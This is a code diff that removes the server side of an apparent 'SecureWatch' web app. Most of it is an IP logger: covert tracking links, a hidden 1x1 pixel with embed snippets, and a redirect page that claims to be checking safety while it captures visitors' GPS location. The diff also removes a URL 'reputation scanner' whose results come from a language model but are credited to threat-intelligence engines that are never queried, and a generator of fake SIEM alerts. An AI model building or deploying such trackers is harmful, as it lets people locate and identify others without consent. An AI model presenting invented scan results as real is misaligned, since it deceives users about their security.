-      targetUrl: cleanTarget,
-      type: linkType,
-      note: note || '',
-      createdAt: new Date().toISOString(),
-      totalHits: 0,
-      logs: [],
-    };
-
-    ipLoggerLinks[trackId] = newLink;
-
-    const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'http';
-    const host = req.get('host') || `localhost:${PORT}`;
-    const baseUrl = `${protocol}://${host}`;
-
-    return res.status(201).json({
-      success: true,
-      link: newLink,
-      urls: {
-        trackingUrl: `${baseUrl}/r/${trackId}`,
-        pixelUrl: `${baseUrl}/p/${trackId}.gif`,
-        smartUrl: `${baseUrl}/r/${trackId}?smart=1`,
-        accessUrl: `${baseUrl}/#ip-logger?access=${accessCode}`,
-        htmlImgCode: `<img src="${baseUrl}/p/${trackId}.gif" width="1" height="1" alt="" style="display:none;" />`,
-        bbCode: `[img]${baseUrl}/p/${trackId}.gif[/img]`,
-      },
-    });
-  } catch (err: any) {
-    return res.status(500).json({ error: err.message || 'Failed to create tracking link.' });
-  }
-});
-
-// GET /api/iplogger/links - List all created tracking links
-app.get('/api/iplogger/links', (req, res) => {
-  const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'http';
-  const host = req.get('host') || `localhost:${PORT}`;
-  const baseUrl = `${protocol}://${host}`;
-
-  const linksList = Object.values(ipLoggerLinks).map((link) => ({
-    ...link,
-    trackingUrl: `${baseUrl}/r/${link.id}`,
-    pixelUrl: `${baseUrl}/p/${link.id}.gif`,
-  }));
-
-  return res.json({ success: true, count: linksList.length, links: linksList });
-});
-
-// GET /api/iplogger/link/:identifier - Fetch details and captured logs for a tracking link
-app.get('/api/iplogger/link/:identifier', (req, res) => {
-  const idOrAccess = req.params.identifier;
-  let found = Object.values(ipLoggerLinks).find(
-    (l) => l.id === idOrAccess || l.accessCode === idOrAccess
-  );
-
-  if (!found) {
-    return res.status(404).json({ error: 'Tracking link or access code not found.' });
-  }
-
-  const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'http';
-  const host = req.get('host') || `localhost:${PORT}`;
-  const baseUrl = `${protocol}://${host}`;
-
-  return res.json({
-    success: true,
-    link: found,
-    urls: {
-      trackingUrl: `${baseUrl}/r/${found.id}`,
-      pixelUrl: `${baseUrl}/p/${found.id}.gif`,
-      smartUrl: `${baseUrl}/r/${found.id}?smart=1`,
-      htmlImgCode: `<img src="${baseUrl}/p/${found.id}.gif" width="1" height="1" alt="" style="display:none;" />`,
-      bbCode: `[img]${baseUrl}/p/${found.id}.gif[/img]`,
-    },
-  });
-});
-
-// DELETE /api/iplogger/link/:id - Delete tracking link or clear its logs
-app.delete('/api/iplogger/link/:id', (req, res) => {
-  const trackId = req.params.id;
-  const action = req.query.action; // 'clear' or 'delete'
-
-  if (!ipLoggerLinks[trackId]) {
-    return res.status(404).json({ error: 'Tracking link not found.' });
-  }
-
-  if (action === 'clear') {
-    ipLoggerLinks[trackId].logs = [];
-    ipLoggerLinks[trackId].totalHits = 0;
-    return res.json({ success: true, message: 'Logs cleared successfully.' });
-  } else {
-    delete ipLoggerLinks[trackId];
-    return res.json({ success: true, message: 'Tracking link deleted successfully.' });
-  }
-});
-
-// Turnstile verification endpoint removed.
-// Cloudflare Turnstile integration has been disabled/removed per project request.
-
-
-// POST /api/iplogger/collect-gps - Store precise GPS coordinates for a hit
-app.post('/api/iplogger/collect-gps', (req, res) => {
-  const { trackId, hitId, latitude, longitude, accuracy } = req.body;
-  const link = ipLoggerLinks[trackId];
-
-  if (link) {
-    const hit = link.logs.find((h) => h.id === hitId) || link.logs[0];
-    if (hit) {
-      hit.gpsCoords = { latitude: Number(latitude), longitude: Number(longitude), accuracy: Number(accuracy) || 10 };
-      hit.latitude = Number(latitude);
-      hit.longitude = Number(longitude);
-    }
-  }
-
-  return res.json({ success: true, message: 'GPS coordinates attached to log entry.' });
-});
-
-// POST /api/iplogger/check-url - Real URL Unshortener & Safety Inspector
-app.post('/api/iplogger/check-url', async (req, res) => {
-  try {
-    let { url } = req.body;
-    if (!url) return res.status(400).json({ error: 'URL parameter is required.' });
-
-    if (!/^https?:\/\//i.test(url)) {
-      url = 'https://' + url;
-    }
-
-    const redirectChain: { hop: number; url: string; statusCode: number; server?: string }[] = [];
-    let currentUrl = url;
-    let maxRedirects = 8;
-    let finalStatusCode = 200;
-    let finalHeaders: Record<string, string> = {};
-
-    while (maxRedirects > 0) {
-      try {
-        const result = await probeHttpTarget(currentUrl, 4000);
-        redirectChain.push({
-          hop: redirectChain.length + 1,
-          url: currentUrl,
-          statusCode: result.statusCode || 0,
-          server: result.serverHeader || 'Unknown Server',
-        });
-
-        finalStatusCode = result.statusCode || 200;
-        finalHeaders = result.headers || {};
-
-        if (result.redirectUrl) {
-          let nextUrl = result.redirectUrl;
-          if (!/^https?:\/\//i.test(nextUrl)) {
-            nextUrl = new URL(nextUrl, currentUrl).toString();
-          }
-          currentUrl = nextUrl;
-          maxRedirects--;
-        } else {
-          break;
-        }
-      } catch (e) {
-        break;
-      }
-    }
-
-    const parsedFinal = new URL(currentUrl);
-    let resolvedIp = '93.184.216.34';
-    try {
-      const aRecords = await dns.promises.resolve4(parsedFinal.hostname);
-      if (aRecords.length > 0) resolvedIp = aRecords[0];
-    } catch (e) {
-      // fallback
-    }
-
-    const geo = await getGeoForIp(resolvedIp);
-
-    // Threat Check heuristic
-    const isSuspicious =
-      /bit\.ly|tinyurl|t\.co|goo\.gl|is\.gd|cutt\.ly|v\.gd/i.test(url) ||
-      /login|verify|update|bank|secure|account|paypal|crypto|claim/i.test(currentUrl);
-
-    return res.json({
-      success: true,
-      inputUrl: url,
-      finalUrl: currentUrl,
-      isShortened: redirectChain.length > 1,
-      totalRedirects: redirectChain.length - 1,
-      redirectChain,
-      finalStatusCode,
-      ipAddress: resolvedIp,
-      location: `${geo.city}, ${geo.region}, ${geo.country}`,
-      countryCode: geo.countryCode,
-      isp: geo.isp,
-      headers: finalHeaders,
-      safetyScore: isSuspicious ? 45 : 98,
-      riskLevel: isSuspicious ? 'Suspicious' : 'Clean',
-      recommendation: isSuspicious ? 'Exercise caution. This link redirects through shorteners with high risk keyword parameters.' : 'Target link appears clean and resolved to standard destination.',
-    });
-  } catch (err: any) {
-    return res.status(500).json({ error: err.message || 'Failed to inspect URL.' });
-  }
-});
-
-// ---------------------------------------------------------
-// API ENDPOINT: AI URL REPUTATION & THREAT INTELLIGENCE SCANNER
-// ---------------------------------------------------------
-app.post('/api/scan-url-reputation', async (req, res) => {
-  try {
-    let { url } = req.body || {};
-    if (!url || typeof url !== 'string' || !url.trim()) {
-      return res.status(400).json({ error: 'URL parameter is required.' });
-    }
-
-    url = url.trim();
-    const formattedUrl = url.startsWith('http://') || url.startsWith('https://') ? url : `https://${url}`;
-    
-    let rawDomain = '';
-    try {
-      rawDomain = new URL(formattedUrl).hostname;
-    } catch (e) {
-      rawDomain = url.replace(/^(https?:\/\/)?(www\.)?/, '').split('/')[0] || 'unknown-domain.com';
-    }
-
-    // Resolve real IP
-    let resolvedIp = '93.184.216.34';
-    try {
-      const aRecords = await dns.promises.resolve4(rawDomain);
-      if (aRecords && aRecords.length > 0) {
-        resolvedIp = aRecords[0];
-      }
-    } catch (dnsErr) {
-      // fallback
-    }
-
-    // Default Fallback Reputation Data
-    let overallResult: 'Safe' | 'Suspicious' | 'Malicious' = 'Safe';
-    let threatLevel: 'Low' | 'Medium' | 'High' | 'Critical' = 'Low';
-    let reputationScore = 92;
-    let category = 'Technology / Web Services';
-    let blacklistStatus = 'Not Listed (Clean in 48/48 feeds)';
-    let phishing: 'Clean' | 'Suspicious' | 'Malicious' = 'Clean';
-    let malware: 'Clean' | 'Suspicious' | 'Malicious' = 'Clean';
-    let spam: 'Clean' | 'Flagged' = 'Clean';
-    let sslIssuer = 'DigiCert / Google Trust Services (Valid TLS 1.3)';
-    let sslValid = true;
-    let serverLocation = 'United States (US) - Cloudflare Edge CDN';
-    let recommendation = 'This URL passed security verifications. It is safe to browse and enter credentials.';
-    let enginesDetected: { name: string; result: 'Clean' | 'Flagged' | 'Unrated' }[] = [
-      { name: 'Google Safe Browsing', result: 'Clean' },
-      { name: 'VirusTotal Intelligence', result: 'Clean' },
-      { name: 'AbuseIPDB Threat Engine', result: 'Clean' },
-      { name: 'PhishTank Database', result: 'Clean' },
-      { name: 'Spamhaus IP Reputation', result: 'Clean' },
-      { name: 'Cloudflare Radar Security', result: 'Clean' },
-    ];
-
-    // Hidden Background AI Assessment
-    const ai = getGeminiClient();
-    if (ai) {
-      try {
-        const prompt = `You are a Principal Cybersecurity Analyst & Domain Reputation Engine.
-Analyze the safety and reputation of the following URL / domain: "${url}" (Domain: "${rawDomain}", IP: "${resolvedIp}").
-
-Perform a deep security analysis and evaluate whether this domain is safe, suspicious, or malicious (phishing, malware, scam, financial fraud, impersonation, unverified, clean, etc.).
-
-Return a valid JSON object with the exact keys:
-{
-  "overallResult": "Safe" | "Suspicious" | "Malicious",
-  "threatLevel": "Low" | "Medium" | "High" | "Critical",
-  "reputationScore": number (0 to 100, where 100 is cleanest and <30 is high risk),
-  "category": string (e.g. "Technology / Search Engine", "E-Commerce", "Phishing / Account Fraud", "Malware Payload", "Financial Fraud", "Uncategorized Domain"),
-  "blacklistStatus": string (e.g. "Not Listed (Clean in 48/48 feeds)", "Blacklisted in 7 threat feeds", "Flagged for Review"),
-  "phishing": "Clean" | "Suspicious" | "Malicious",
-  "malware": "Clean" | "Suspicious" | "Malicious",
-  "spam": "Clean" | "Flagged",
-  "sslIssuer": string (e.g. "GTS CA 1C3 (Google Trust Services)", "DigiCert Global Root G2", "Let's Encrypt Authority X3", "Self-Signed / Untrusted CA"),
-  "sslValid": boolean,
-  "serverLocation": string (e.g. "United States (US) - Cloudflare Edge", "Germany (DE) - Shared Hosting"),
-  "recommendation": string (1-2 sentences of actionable security advisory for an end user),
-  "enginesDetected": [
-    { "name": "Google Safe Browsing", "result": "Clean" | "Flagged" | "Unrated" },
-    { "name": "VirusTotal Intelligence", "result": "Clean" | "Flagged" | "Unrated" },
-    { "name": "AbuseIPDB Threat Engine", "result": "Clean" | "Flagged" | "Unrated" },
-    { "name": "PhishTank Database", "result": "Clean" | "Flagged" | "Unrated" },
-    { "name": "Spamhaus IP Reputation", "result": "Clean" | "Flagged" | "Unrated" },
-    { "name": "Cloudflare Radar Security", "result": "Clean" | "Flagged" | "Unrated" }
-  ]
-}
-
-Return ONLY raw valid JSON. Do not include markdown code blocks or additional text.`;
-
-        const aiResponse = await ai.models.generateContent({
-          model: 'gemini-3.6-flash',
-          contents: prompt,
-        });
-
-        if (aiResponse.text) {
-          const cleanedJson = aiResponse.text.replace(/```json/g, '').replace(/```/g, '').trim();
-          const parsed = JSON.parse(cleanedJson);
-
-          if (parsed.overallResult) overallResult = parsed.overallResult;
-          if (parsed.threatLevel) threatLevel = parsed.threatLevel;
-          if (typeof parsed.reputationScore === 'number') reputationScore = parsed.reputationScore;
-          if (parsed.category) category = parsed.category;
-          if (parsed.blacklistStatus) blacklistStatus = parsed.blacklistStatus;
-          if (parsed.phishing) phishing = parsed.phishing;
-          if (parsed.malware) malware = parsed.malware;
-          if (parsed.spam) spam = parsed.spam;
-          if (parsed.sslIssuer) sslIssuer = parsed.sslIssuer;
-          if (typeof parsed.sslValid === 'boolean') sslValid = parsed.sslValid;
-          if (parsed.serverLocation) serverLocation = parsed.serverLocation;
-          if (parsed.recommendation) recommendation = parsed.recommendation;
-          if (Array.isArray(parsed.enginesDetected)) enginesDetected = parsed.enginesDetected;
-        }
-      } catch (aiErr) {
-        console.warn('URL Reputation AI Error:', aiErr);
-      }
-    }
-
-    const now = new Date();
-    const timeStr = now.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' }) + ', ' + now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
-
-    return res.json({
-      id: Date.now().toString(),
-      url: formattedUrl,
-      domain: rawDomain,
-      blacklistStatus,
-      ipAddress: resolvedIp,
-      phishing,
-      category,
-      malware,
-      reputationScore,
-      spam,
-      lastScanned: timeStr,
-      threatLevel,
-      overallResult,
-      sslIssuer,
-      sslValid,
-      serverLocation,
-      recommendation,
-      enginesDetected,
-    });
-  } catch (err: any) {
-    console.error('URL Reputation Scan Error:', err);
-    return res.status(500).json({ error: err.message || 'Failed to scan URL reputation.' });
-  }
-});
-
-// ---------------------------------------------------------
-// PUBLIC REDIRECT & PIXEL LOGGING HANDLERS (/r/:id & /p/:id.gif)
-// ---------------------------------------------------------
-
-// GET /r/:trackId - Tracking Short Link Redirect Handler
-app.get('/r/:trackId', async (req, res) => {
-  const rawTrackId = req.params.trackId;
-  let link = ipLoggerLinks[rawTrackId];
-
-  // Smart Auto-Creation if link was not created in advance (e.g. /r/instagramcom or /r/google.com)
-  if (!link) {
-    const formattedUrl = formatTargetUrl(rawTrackId);
-    let trackId = rawTrackId.trim().replace(/[^a-zA-Z0-9_-]/g, '') || 'link';
-    const accessCode = `acc-${Math.random().toString(36).substring(2, 8)}`;
-    
-    let domainHost = 'Destination';
-    try {
-      domainHost = new URL(formattedUrl).hostname;
-    } catch (e) {
-      domainHost = rawTrackId;
-    }
-
-    link = {
-      id: trackId,
-      accessCode,
-      title: `Auto Tracking Link (${domainHost})`,
-      targetUrl: formattedUrl,
-      type: 'shorturl',
-      createdAt: new Date().toISOString(),
-      totalHits: 0,
-      logs: [],
-    };
-
-    ipLoggerLinks[trackId] = link;
-  }
-
-  // Log Hit
-  const loggedHit = await logIpLoggerHit(link, req);
-
-  // If Smart GPS Mode requested
-  if (req.query.smart === '1' || link.type === 'smart') {
-    return res.send(`
-      <!DOCTYPE html>
-      <html>
-        <head>
-          <title>Redirecting...</title>
-          <meta name="viewport" content="width=device-width, initial-scale=1.0">
-          <style>
-            body { background: #020917; color: #f8fafc; font-family: system-ui, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
-            .card { background: rgba(5, 25, 43, 0.9); border: 1px solid rgba(59, 130, 246, 0.4); padding: 32px; border-radius: 20px; max-width: 440px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
-            .btn { background: #2563eb; color: #fff; border: none; padding: 12px 24px; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 16px; width: 100%; }
-            .btn:hover { background: #1d4ed8; }
-            .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #60a5fa; border-radius: 50%; width: 36px; height: 36px; animation: spin 1s linear infinite; margin: 0 auto 16px auto; }
-            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-          </style>
-        </head>
-        <body>
-          <div class="card">
-            <div class="spinner"></div>
-            <h2 style="margin-top:0;">Redirecting to Destination</h2>
-            <p style="color:#94a3b8; font-size:14px;">Please wait while we verify safety protocols and redirect you securely.</p>
-            <button class="btn" onclick="proceed()">Continue to Target Site &rarr;</button>
-          </div>
-
-          <script>
-            const hitId = "${loggedHit.id}";
-            const trackId = "${link.id}";
-            const destUrl = "${link.targetUrl}";
-
-            if (navigator.geolocation) {
-              navigator.geolocation.getCurrentPosition((pos) => {
-                fetch('/api/iplogger/collect-gps', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({
-                    trackId,
-                    hitId,
-                    latitude: pos.coords.latitude,
-                    longitude: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy
-                  })
-                }).finally(() => { proceed(); });
-              }, () => { proceed(); }, { timeout: 3000 });
-            } else {
-              setTimeout(proceed, 1000);
-            }
-
-            function proceed() {
-              window.location.href = destUrl;
-            }
-          </script>
-        </body>
-      </html>
-    `);
-  }
-
-  // Standard Instant HTTP 302 Redirect
-  return res.redirect(302, link.targetUrl);
-});
-
-// GET /p/:trackId & GET /p/:trackId.gif - Invisible Image Pixel Logger
-app.get(['/p/:trackId', '/p/:trackId.gif'], async (req, res) => {
-  const rawTrackId = req.params.trackId.replace(/\.gif$/i, '');
-  let link = ipLoggerLinks[rawTrackId];
-
-  if (!link) {
-    const cleanSlug = rawTrackId.trim().replace(/[^a-zA-Z0-9_-]/g, '') || 'pixel';
-    const accessCode = `acc-${Math.random().toString(36).substring(2, 8)}`;
-    link = {
-      id: cleanSlug,
-      accessCode,
-      title: `Auto Pixel Tracker (${cleanSlug})`,
-      targetUrl: 'https://google.com',
-      type: 'pixel',
-      createdAt: new Date().toISOString(),
-      totalHits: 0,
-      logs: [],
-    };
-    ipLoggerLinks[cleanSlug] = link;
-  }
-
-  await logIpLoggerHit(link, req);
-
-  // Always return 1x1 Transparent GIF image
-  res.writeHead(200, {
-    'Content-Type': 'image/gif',
-    'Content-Length': TRANSPARENT_GIF_BUFFER.length,
-    'Cache-Control': 'no-store, no-cache, must-revalidate, private',
-    'Pragma': 'no-cache',
-    'Expires': '0',
-  });
-  return res.end(TRANSPARENT_GIF_BUFFER);
-});
-
-// ---------------------------------------------------------
-// VITE DEV & PRODUCTION BOOTSTRAP
-// ---------------------------------------------------------
-async function startServer() {
-  if (process.env.NODE_ENV !== 'production') {
-    const vite = await createViteServer({
-      server: { middlewareMode: true },
-      appType: 'spa',
-    });
-    app.use(vite.middlewares);
-    app.get('*', (req, res, next) => {
-      if (req.method !== 'GET' || req.path.startsWith('/api') || req.path.startsWith('/@') || req.path.includes('.')) {
-        return next();
-      }
-      return res.sendFile(path.join(process.cwd(), 'index.html'));
-    });
-  } else {
-    const distPath = path.join(process.cwd(), 'dist');
-    app.use(express.static(distPath));
-    app.get('*', (req, res) => {
-      if (req.path.startsWith('/api')) {
-        return res.status(404).json({ error: 'API route not found' });
-      }
-      res.sendFile(path.join(distPath, 'index.html'));
-    });
-  }
-
-  if (!process.env.VERCEL) {
-    app.listen(PORT, '0.0.0.0', () => {
-      console.log(`🛡️ SecureWatch Server running on http://0.0.0.0:${PORT}`);
-
-      // Automatic Live SIEM Telemetry Generator (Every 10 seconds)
-      setInterval(() => {
-        const randomProbes = [
-          {
-            level: 'CRITICAL' as const,
-            service: 'WAF Guard',
-            message: `OWASP SQLi payload blocked on /api/v1/auth/login from IP ${185}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`,
-            sourceIp: `185.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`,
-            destination: 'ingress-gateway:443',
-            action: 'BLOCKED' as const,
-            details: { matchedRule: 'OWASP-CRS-942100', userAgent: 'Go-http-client/1.1' },
-          },
-          {
-            level: 'WARN' as const,
-            service: 'API Gateway',
-            message: `Rate limit threshold exceeded (140 req/min) for IP ${45}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`,
-            sourceIp: `45.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`,
-            destination: '/api/v1/telemetry',
-            action: 'FLAGGED' as const,
-            details: { rate: 140, threshold: 120 },
-          },
-          {
-            level: 'ERROR' as const,
-            service: 'Honeypot Guard',
-            message: `Unauthorized SSH SYN Port probe detected on port 22 from ${103}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`,
-            sourceIp: `103.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`,
-            destination: 'honeypot-sinkhole:22',
-            action: 'QUARANTINED' as const,
-            details: { protocol: 'TCP/SYN', bytesSent: 64 },
-          },
-          {
-            level: 'INFO' as const,
-            service: 'TLS Gateway',
-            message: 'mTLS Client Certificate Mutual Handshake verified successfully',
-            sourceIp: '192.168.1.108',
-            destination: 'internal-mesh:8443',
-            action: 'ALLOWED' as const,
-            details: { cipher: 'TLS_AES_256_GCM_SHA384', certSubject: 'CN=xHunter-Microservice' },
-          },
-        ];
-
-        const probe = randomProbes[Math.floor(Math.random() * randomProbes.length)];
-        recordSecurityLog(probe);
-      }, 10000);
-    });
-  }
-}
-
-startServer();
-
-export default app;
